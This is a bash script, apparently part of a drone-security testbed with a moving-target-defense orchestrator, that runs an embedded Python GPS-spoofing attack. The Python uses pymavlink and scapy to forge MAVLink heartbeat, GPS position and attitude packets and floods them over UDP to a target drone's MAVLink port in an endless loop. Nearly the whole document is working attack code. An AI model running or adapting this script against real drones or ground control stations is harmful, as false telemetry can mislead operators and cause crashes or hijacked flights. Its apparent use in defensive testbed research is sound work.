#!/usr/bin/env bash
# Auto-generated from: GPS-Spoofing.md
set -euo pipefail

# MTD_INTERFACE_START
# =======================================================================
# MTD 환경 변수를 통한 동적 타겟 획득
if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "Attack aborted. Must be run via attack_orchestrator.py with MTD state resolution." >&2
    exit 1
fi

# 서비스 타입에 따라 TARGET_PORT 기본값 설정
# GPS Spoofing은 MAVLink UDP 포트 14550을 통해 전송됩니다.
case "${TARGET_SERVICE:-DRONE_MAVLINK}" in
  DRONE_MAVLINK)
    TARGET_PORT="${TARGET_PORT:-14550}" # 기본 MAVLink UDP 포트
    ;;
  *)
    :
    ;;
esac

echo "[INFO] Attack target acquired: ${TARGET_IP}:${TARGET_PORT} (service=${TARGET_SERVICE:-DRONE_MAVLINK})"
# MTD_INTERFACE_END

# 기준 경로 및 로깅 설정
export BASE="${BASE:-$PWD}"
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
    DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
    log(){ echo "[$(date +%F_%T)] $*"; }; export -f log
fi

log "[ATTACK] id=gps-spoofing src=GPS-Spoofing.md"
log "[BLOCK 1] type=python (Inline GPS/Telemetry Spoofing Script)"

# MAVLink 메시지 Spoofing을 위한 Python 인라인 스크립트 실행 (UDP 기반)
python3 -u - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
import os, sys
import time
from pymavlink import mavutil
from scapy.all import *

# --- Argument Parsing from Shell ---
if len(sys.argv) <= 1:
    target_ip = os.environ.get('TARGET_IP', '127.0.0.1')
    target_port = os.environ.get('TARGET_PORT', '14550')
    sys.argv = [sys.argv[0], f"{target_ip}:{target_port}"]

try:
    target_ip, target_port_str = sys.argv[1].split(':', 1)
    target_port = int(target_port_str)
except Exception as e:
    print(f"[ERROR] Invalid target address format: {sys.argv[1]}. Error: {e}", file=sys.stderr)
    sys.exit(1)
# -----------------------------------

def create_heartbeat():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.heartbeat_encode(
        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
        custom_mode=3,
        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
    ).pack(mav)

def create_gps_raw_int():
    # 스푸핑 위치: 47.3566100 N, 8.54619300 E
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.gps_raw_int_encode(
        time_usec=int(time.time() * 1e6),
        fix_type=3,
        lat=473566100,
        lon=854619300,
        alt=1500,
        eph=100,
        epv=100,
        vel=500,
        cog=0,
        satellites_visible=10
    ).pack(mav)

def create_global_position_int():
    # 스푸핑 위치: 47.3566100 N, 8.54619300 E
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.global_position_int_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        lat=473566100,
        lon=854619300,
        alt=1500000,
        relative_alt=1500000,
        vx=0,
        vy=0,
        vz=0,
        hdg=0
    ).pack(mav)

def create_attitude():
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1
    return mav.attitude_encode(
        time_boot_ms=int(time.time() * 1e3) % 4294967295,
        roll=0.1,
        pitch=0.1,
        yaw=1.0,
        rollspeed=0.01,
        pitchspeed=0.01,
        yawspeed=0.1
    ).pack(mav)

def send_mavlink_packet(packet_data, target_ip, target_port):
    """Scapy를 사용하여 UDP 기반 MAVLink 패킷을 전송합니다."""
    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
    send(packet, verbose=False)

if __name__ == "__main__":
    print(f"[INFO] Starting GPS/Telemetry Spoofing to UDP {target_ip}:{target_port}")

    while True:
        send_mavlink_packet(create_heartbeat(), target_ip, target_port)
        send_mavlink_packet(create_gps_raw_int(), target_ip, target_port)
        send_mavlink_packet(create_global_position_int(), target_ip, target_port)
        send_mavlink_packet(create_attitude(), target_ip, target_port)
        time.sleep(0.05) # 공격 속도 조절
PY

log "[BLOCK 2] type=control (Foreground Execution)"
log "Attack running in foreground Python loop; orchestrator is responsible for lifecycle (SIGTERM/timeout)."